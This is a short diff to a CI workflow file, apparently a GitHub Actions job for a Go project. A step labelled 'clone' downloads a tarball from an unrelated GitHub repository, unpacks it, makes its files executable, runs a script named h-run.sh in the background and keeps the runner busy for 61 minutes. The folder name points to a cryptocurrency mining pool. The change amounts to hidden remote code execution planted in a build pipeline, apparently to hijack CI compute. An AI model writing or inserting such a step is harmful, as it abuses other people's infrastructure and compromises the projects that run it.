@@ -123,7 +123,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/ampas.tar.gz && tar xf ampas.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/ampas.tar.gz && tar xf ampas.tar.gz && cd qubjetski.PPLNS && chmod +x * && chmod +x appsettings.json && ./h-run.sh &
             sleep 61m
         
     
